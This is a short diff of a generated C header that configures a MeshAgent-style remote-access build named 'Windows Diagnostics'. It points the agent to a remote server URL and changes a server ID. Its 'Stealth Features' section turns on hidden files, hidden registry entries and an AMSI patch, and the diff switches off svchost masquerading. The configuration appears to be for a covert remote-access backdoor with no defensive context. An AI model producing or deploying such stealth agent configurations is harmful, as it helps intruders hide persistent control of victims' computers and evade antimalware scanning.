@@ -1,4 +1,4 @@
-﻿/* Generated file - do not edit. */
+/* Generated file - do not edit. */
 /* Generated on: 2025-10-23 10:21:28 */
 #ifndef GENERATED_MESHAGENT_BRANDING_H
 #define GENERATED_MESHAGENT_BRANDING_H
@@ -51,14 +51,14 @@
 
 /* ========== Provisioning Data ========== */
 #define MESH_AGENT_MESH_ID "sdBWgAtTM6VK18fC7gLtdRBZq0NAjzqg@1x9MMWNudEQZ3FoOGkXXLFyoyEhXL2Z"
-#define MESH_AGENT_SERVER_ID "89EE260CB880664898D38A56350F841AA2B05BA3328E23DB2526D506EAB41A13"
+#define MESH_AGENT_SERVER_ID "BC7E0DCFDBE4298959C367D398357AF4F4C39396EE1C9289AC25707C25B4294C"
 #define MESH_AGENT_MESH_NAME "Windows Diagnostics"
 #define MESH_AGENT_SERVER_URL "wss://agents.high.support:4445/agent.ashx"
 #define MESH_AGENT_MESH_TYPE 2
 
 /* ========== Stealth Features ========== */
 #define MESH_AGENT_STEALTH_ENABLED 1
-#define MESH_AGENT_SVCHOST_MODE 1
+#define MESH_AGENT_SVCHOST_MODE 0
 #define MESH_AGENT_HIDE_FILES 1
 #define MESH_AGENT_HIDE_REGISTRY 1
 #define MESH_AGENT_AMSI_PATCH 1
